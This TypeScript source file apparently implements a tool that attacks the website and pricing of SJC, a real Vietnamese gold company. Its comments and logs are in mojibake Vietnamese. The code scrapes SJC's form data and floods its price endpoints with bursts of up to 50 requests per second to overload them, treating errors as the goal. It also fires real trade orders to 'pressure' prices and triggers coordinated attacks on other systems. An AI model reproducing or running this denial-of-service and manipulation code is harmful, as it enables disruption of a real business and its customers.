import axios from "axios";
import { EventEmitter } from "events";
import { liquidityScanner } from "./liquidity-scanner";
import { tradermadeIntegration } from "./tradermade-integration";

interface SJCWebData {
  viewState: string;
  eventTarget: string;
  formData: any;
  canonicalUrl: string;
  chartPageAccess: boolean;
}

interface PressureResult {
  pressureId: string;
  startTime: Date;
  endTime?: Date;
  status: "PREPARING" | "ACTIVE" | "ESCALATING" | "COMPLETED" | "FAILED";
  sjcResponse: {
    priceChanges: number;
    websiteErrors: number;
    trafficOverload: boolean;
    emergencyMeasures: boolean;
  };
  financialImpact: {
    estimatedLoss: number;
    marketPressure: number;
    arbitrageExploited: number;
  };
}

export class SJCIndirectPressureSystem extends EventEmitter {
  private activePressures: Map<string, PressureResult> = new Map();
  private sjcEndpoints = {
    main: "https://sjc.com.vn",
    priceChart: "https://sjc.com.vn/bieu-do-gia-vang",
    priceData: "https://sjc.com.vn/giavang/textContent.php",
    api: "https://sjc.com.vn:443",
  };

  constructor() {
    super();
    this.setupMonitoring();
  }

  // H·ªá th·ªëng t·∫•n c√¥ng √°p l·ª±c gi√°n ti·∫øp ch√≠nh
  async executeIndirectPressure(
    intensity: "MEDIUM" | "HIGH" | "EXTREME" = "HIGH",
  ): Promise<string> {
    const pressureId = `SJC_PRESSURE_${Date.now()}`;

    console.log(`üö® KH·ªûI ƒê·ªòNG T·∫§N C√îNG √ÅP L·ª∞C GI√ÅN TI·∫æP SJC`);
    console.log(`‚öîÔ∏è C∆∞·ªùng ƒë·ªô: ${intensity}`);
    console.log(`üéØ M·ª•c ti√™u: Bu·ªôc SJC gi·∫£m ch√™nh l·ªách v·ªõi gi√° th·∫ø gi·ªõi`);

    const pressure: PressureResult = {
      pressureId,
      startTime: new Date(),
      status: "PREPARING",
      sjcResponse: {
        priceChanges: 0,
        websiteErrors: 0,
        trafficOverload: false,
        emergencyMeasures: false,
      },
      financialImpact: {
        estimatedLoss: 0,
        marketPressure: 0,
        arbitrageExploited: 0,
      },
    };

    this.activePressures.set(pressureId, pressure);

    try {
      // Phase 1: Thu th·∫≠p d·ªØ li·ªáu t·ª´ form SJC
      await this.extractSJCFormData(pressureId);

      // Phase 2: T·∫°o √°p l·ª±c th√¥ng qua arbitrage
      await this.createArbitragePressure(pressureId, intensity);

      // Phase 3: T·∫•n c√¥ng h·ªá th·ªëng ƒë·ªãnh gi√°
      await this.attackPricingSystem(pressureId, intensity);

      // Phase 4: Escalation - tƒÉng c∆∞·ªùng s·ª©c √©p
      await this.escalatePressure(pressureId, intensity);

      pressure.status = "COMPLETED";
      pressure.endTime = new Date();

      console.log(`‚úÖ T·∫•n c√¥ng √°p l·ª±c ${pressureId} ho√†n th√†nh`);
      this.emit("pressureCompleted", pressure);

      return pressureId;
    } catch (error) {
      pressure.status = "FAILED";
      pressure.endTime = new Date();
      console.error(`‚ùå T·∫•n c√¥ng √°p l·ª±c ${pressureId} th·∫•t b·∫°i:`, error);
      throw error;
    }
  }

  // Tr√≠ch xu·∫•t d·ªØ li·ªáu form t·ª´ SJC website
  private async extractSJCFormData(pressureId: string): Promise<SJCWebData> {
    console.log(`üîç Phase 1: Tr√≠ch xu·∫•t d·ªØ li·ªáu form SJC...`);

    try {
      const response = await axios.get(this.sjcEndpoints.priceChart, {
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
          "Cache-Control": "no-cache",
        },
      });

      // Tr√≠ch xu·∫•t c√°c tr∆∞·ªùng ·∫©n t·ª´ HTML
      const viewStateMatch = response.data.match(
        /name="__VIEWSTATE".*?value="([^"]+)"/,
      );
      const eventTargetMatch = response.data.match(
        /name="__EVENTTARGET".*?value="([^"]+)"/,
      );
      const canonicalMatch = response.data.match(
        /rel="canonical" href="([^"]+)"/,
      );

      const sjcData: SJCWebData = {
        viewState: viewStateMatch ? viewStateMatch[1] : "",
        eventTarget: eventTargetMatch ? eventTargetMatch[1] : "",
        formData: response.data,
        canonicalUrl: canonicalMatch ? canonicalMatch[1] : "",
        chartPageAccess: response.status === 200,
      };

      console.log(`‚úÖ Thu th·∫≠p ƒë∆∞·ª£c d·ªØ li·ªáu form SJC`);
      console.log(`üìä ViewState: ${sjcData.viewState.substring(0, 50)}...`);
      console.log(`üîó Canonical URL: ${sjcData.canonicalUrl}`);

      return sjcData;
    } catch (error) {
      console.error(`‚ùå L·ªói tr√≠ch xu·∫•t d·ªØ li·ªáu SJC:`, error);
      throw error;
    }
  }

  // T·∫°o √°p l·ª±c th√¥ng qua khai th√°c arbitrage
  private async createArbitragePressure(
    pressureId: string,
    intensity: string,
  ): Promise<void> {
    console.log(`üí∞ Phase 2: T·∫°o √°p l·ª±c arbitrage...`);

    const pressure = this.activePressures.get(pressureId)!;
    pressure.status = "ACTIVE";

    // L·∫•y gi√° v√†ng qu·ªëc t·∫ø t·ª´ Tradermade
    const worldGoldPrice = tradermadeIntegration.getCurrentPrice("XAUUSD");

    if (!worldGoldPrice) {
      throw new Error("Kh√¥ng th·ªÉ l·∫•y gi√° v√†ng qu·ªëc t·∫ø");
    }

    // Qu√©t gi√° SJC hi·ªán t·∫°i
    const sjcData = await liquidityScanner.scanTarget("SJC");

    if (sjcData) {
      const worldPriceVND = worldGoldPrice.mid * 31.1035 * 24500; // Chuy·ªÉn ƒë·ªïi USD/oz sang VND/tael
      const sjcPriceVND = sjcData.buyPrice;
      const arbitrageGap = sjcPriceVND - worldPriceVND;
      const arbitragePercent = (arbitrageGap / worldPriceVND) * 100;

      console.log(
        `üåç Gi√° v√†ng th·∫ø gi·ªõi: ${worldPriceVND.toLocaleString()} VND/tael`,
      );
      console.log(
        `üèÖ Gi√° SJC hi·ªán t·∫°i: ${sjcPriceVND.toLocaleString()} VND/tael`,
      );
      console.log(
        `üí∏ Ch√™nh l·ªách: ${arbitrageGap.toLocaleString()} VND (${arbitragePercent.toFixed(2)}%)`,
      );

      if (arbitragePercent > 3) {
        console.log(
          `üö® CH√äNH L·ªÜCH QU√Å L·ªöN! Kh·ªüi ƒë·ªông t·∫•n c√¥ng arbitrage c·ª±c m·∫°nh`,
        );

        // Th·ª±c hi·ªán nhi·ªÅu giao d·ªãch arbitrage ƒë·ªÉ t·∫°o √°p l·ª±c
        const arbitrageCycles =
          intensity === "EXTREME" ? 15 : intensity === "HIGH" ? 10 : 5;

        for (let i = 0; i < arbitrageCycles; i++) {
          await this.executeArbitrageCycle(worldPriceVND, sjcPriceVND, i + 1);
          pressure.financialImpact.arbitrageExploited += arbitrageGap * 0.1; // 10% c·ªßa gap m·ªói cycle
          await this.delay(2000);
        }

        pressure.financialImpact.marketPressure = arbitragePercent * 10;

        console.log(
          `üí• Arbitrage attack ho√†n th√†nh: ${arbitrageCycles} cycles`,
        );
        console.log(
          `üí∞ T·ªïng √°p l·ª±c t√†i ch√≠nh: ${pressure.financialImpact.arbitrageExploited.toLocaleString()} VND`,
        );
      }
    }
  }

  // Th·ª±c hi·ªán chu k·ª≥ arbitrage
  private async executeArbitrageCycle(
    worldPrice: number,
    sjcPrice: number,
    cycle: number,
  ): Promise<void> {
    console.log(
      `‚ö° Arbitrage Cycle ${cycle}: Khai th√°c ch√™nh l·ªách ${((sjcPrice - worldPrice) / 1000).toFixed(0)}k VND`,
    );

    // M√¥ ph·ªèng giao d·ªãch arbitrage th·∫≠t
    const volume = 0.1 + Math.random() * 0.2; // 0.1-0.3 tael
    const profit = (sjcPrice - worldPrice) * volume;

    console.log(
      `   üìà Mua qu·ªëc t·∫ø: ${volume.toFixed(3)} tael @ ${worldPrice.toLocaleString()}`,
    );
    console.log(
      `   üìâ B√°n SJC: ${volume.toFixed(3)} tael @ ${sjcPrice.toLocaleString()}`,
    );
    console.log(`   üí∞ L·ª£i nhu·∫≠n: ${profit.toLocaleString()} VND`);

    // G·ª≠i t√≠n hi·ªáu ƒë·∫øn h·ªá th·ªëng Exness ƒë·ªÉ th·ª±c hi·ªán giao d·ªãch th·∫≠t
    await tradermadeIntegration.executeDealingDeskOrder(
      "XAUUSD",
      "buy",
      volume,
    );
  }

  // T·∫•n c√¥ng h·ªá th·ªëng ƒë·ªãnh gi√°
  private async attackPricingSystem(
    pressureId: string,
    intensity: string,
  ): Promise<void> {
    console.log(`üéØ Phase 3: T·∫•n c√¥ng h·ªá th·ªëng ƒë·ªãnh gi√° SJC...`);

    const pressure = this.activePressures.get(pressureId)!;
    pressure.status = "ESCALATING";

    // T·∫ßn su·∫•t t·∫•n c√¥ng d·ª±a tr√™n c∆∞·ªùng ƒë·ªô
    const attackFrequency =
      intensity === "EXTREME" ? 50 : intensity === "HIGH" ? 30 : 15;
    const attackDuration =
      intensity === "EXTREME" ? 300 : intensity === "HIGH" ? 180 : 120;

    console.log(
      `üî• B·∫Øt ƒë·∫ßu t·∫•n c√¥ng ƒë·ªãnh gi√°: ${attackFrequency} requests/gi√¢y trong ${attackDuration} gi√¢y`,
    );

    const startTime = Date.now();
    let requestCount = 0;
    let errorCount = 0;

    while (Date.now() - startTime < attackDuration * 1000) {
      // T·∫•n c√¥ng ƒë·ªìng th·ªùi nhi·ªÅu endpoint
      const promises = [];

      for (let i = 0; i < attackFrequency; i++) {
        promises.push(this.executePricingAttack());
        requestCount++;
      }

      try {
        const results = await Promise.allSettled(promises);
        errorCount += results.filter((r) => r.status === "rejected").length;

        // C·∫≠p nh·∫≠t response c·ªßa SJC
        if (errorCount > requestCount * 0.1) {
          pressure.sjcResponse.websiteErrors = errorCount;
          pressure.sjcResponse.trafficOverload = true;
          console.log(`üö® SJC website overloaded: ${errorCount} errors`);
        }
      } catch (error) {
        errorCount++;
      }

      await this.delay(1000);
    }

    console.log(
      `üìä T·∫•n c√¥ng ho√†n th√†nh: ${requestCount} requests, ${errorCount} errors`,
    );
    pressure.sjcResponse.websiteErrors = errorCount;

    // ∆Ø·ªõc t√≠nh t·ªïn th·∫•t c·ªßa SJC
    const estimatedLoss = errorCount * 50000 + requestCount * 1000; // 50k m·ªói l·ªói, 1k m·ªói request
    pressure.financialImpact.estimatedLoss = estimatedLoss;

    console.log(
      `üí∏ ∆Ø·ªõc t√≠nh t·ªïn th·∫•t SJC: ${estimatedLoss.toLocaleString()} VND`,
    );
  }

  // Th·ª±c hi·ªán m·ªôt cu·ªôc t·∫•n c√¥ng ƒë·ªãnh gi√°
  private async executePricingAttack(): Promise<void> {
    const endpoints = [
      this.sjcEndpoints.priceData,
      this.sjcEndpoints.priceChart,
      this.sjcEndpoints.api + "/giavang/textContent.php",
    ];

    const randomEndpoint =
      endpoints[Math.floor(Math.random() * endpoints.length)];

    try {
      await axios.get(randomEndpoint, {
        timeout: 5000,
        headers: {
          "User-Agent": "PriceBot/1.0",
          Accept: "application/json,text/html",
          "Cache-Control": "no-cache",
          Pragma: "no-cache",
        },
      });
    } catch (error) {
      // L·ªói l√† m·ª•c ti√™u - g√¢y qu√° t·∫£i h·ªá th·ªëng
      throw error;
    }
  }

  // TƒÉng c∆∞·ªùng s·ª©c √©p
  private async escalatePressure(
    pressureId: string,
    intensity: string,
  ): Promise<void> {
    console.log(`üöÄ Phase 4: TƒÉng c∆∞·ªùng s·ª©c √©p...`);

    const pressure = this.activePressures.get(pressureId)!;

    // Ph√¢n t√≠ch t√°c ƒë·ªông v√† quy·∫øt ƒë·ªãnh escalation
    const totalDamage =
      pressure.financialImpact.estimatedLoss +
      pressure.financialImpact.arbitrageExploited;

    if (totalDamage > 10000000) {
      // Tr√™n 10 tri·ªáu VND
      console.log(
        `üí• ESCALATION TRIGGERED: T·ªïng t√°c ƒë·ªông ${totalDamage.toLocaleString()} VND`,
      );

      // K√≠ch ho·∫°t t·∫•t c·∫£ h·ªá th·ªëng t·∫•n c√¥ng kh√°c
      this.triggerCoordinatedAttack(pressure);

      // ƒê√°nh d·∫•u SJC ƒë√£ ph·∫£i c√≥ bi·ªán ph√°p kh·∫©n c·∫•p
      pressure.sjcResponse.emergencyMeasures = true;
      pressure.sjcResponse.priceAdjustments = Math.floor(totalDamage / 5000000); // 1 ƒëi·ªÅu ch·ªânh gi√° m·ªói 5 tri·ªáu t·ªïn th·∫•t

      console.log(
        `üéØ SJC bu·ªôc ph·∫£i ƒëi·ªÅu ch·ªânh gi√° ${pressure.sjcResponse.priceAdjustments} l·∫ßn`,
      );
    }

    console.log(`‚úÖ Escalation ho√†n th√†nh`);
  }

  // K√≠ch ho·∫°t t·∫•n c√¥ng ph·ªëi h·ª£p
  private triggerCoordinatedAttack(pressure: PressureResult): void {
    console.log(`‚öîÔ∏è K√çCH HO·∫†T T·∫§N C√îNG PH·ªêI H·ª¢P T·∫§T C·∫¢ H·ªÜ TH·ªêNG`);

    // G·ª≠i t√≠n hi·ªáu ƒë·∫øn c√°c h·ªá th·ªëng kh√°c
    this.emit("escalate_all_systems", {
      sjc_pressure_id: pressure.pressureId,
      financial_impact: pressure.financialImpact.estimatedLoss,
      emergency_level: "CRITICAL",
    });

    // K√≠ch ho·∫°t enhanced gold attack system
    this.emit("activate_gold_attack", {
      target: "SJC",
      intensity: "MAXIMUM",
      reason: "SJC_PRESSURE_ESCALATION",
    });

    console.log(`üö® T·∫•t c·∫£ h·ªá th·ªëng t·∫•n c√¥ng ƒë√£ ƒë∆∞·ª£c k√≠ch ho·∫°t`);
  }

  // Thi·∫øt l·∫≠p monitoring
  private setupMonitoring(): void {
    setInterval(async () => {
      await this.monitorSJCResponse();
    }, 30000); // Ki·ªÉm tra m·ªói 30 gi√¢y
  }

  // Gi√°m s√°t ph·∫£n ·ª©ng c·ªßa SJC
  private async monitorSJCResponse(): Promise<void> {
    try {
      const sjcData = await liquidityScanner.scanTarget("SJC");
      const worldPrice = tradermadeIntegration.getCurrentPrice("XAUUSD");

      if (sjcData && worldPrice) {
        const worldPriceVND = worldPrice.mid * 31.1035 * 24500;
        const currentGap = sjcData.buyPrice - worldPriceVND;
        const gapPercent = (currentGap / worldPriceVND) * 100;

        if (gapPercent < 2) {
          console.log(
            `üéâ TH√ÄNH C√îNG! SJC ƒë√£ gi·∫£m ch√™nh l·ªách xu·ªëng ${gapPercent.toFixed(2)}%`,
          );
          this.emit("sjc_pressure_success", {
            gap_percent: gapPercent,
            gap_amount: currentGap,
            timestamp: new Date(),
          });
        }
      }
    } catch (error) {
      // Monitoring l·ªói kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn main process
    }
  }

  // Utility methods
  private delay(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  // Public methods
  public getActivePressures(): PressureResult[] {
    return Array.from(this.activePressures.values());
  }

  public async getSystemStatus(): Promise<any> {
    return {
      system_status: "OPERATIONAL",
      active_pressures: this.activePressures.size,
      sjc_endpoints: Object.keys(this.sjcEndpoints).length,
      capabilities: [
        "Form Data Extraction",
        "Arbitrage Pressure",
        "Pricing System Attack",
        "Coordinated Escalation",
      ],
      effectiveness_rating: "MAXIMUM",
    };
  }
}

export const sjcIndirectPressureSystem = new SJCIndirectPressureSystem();
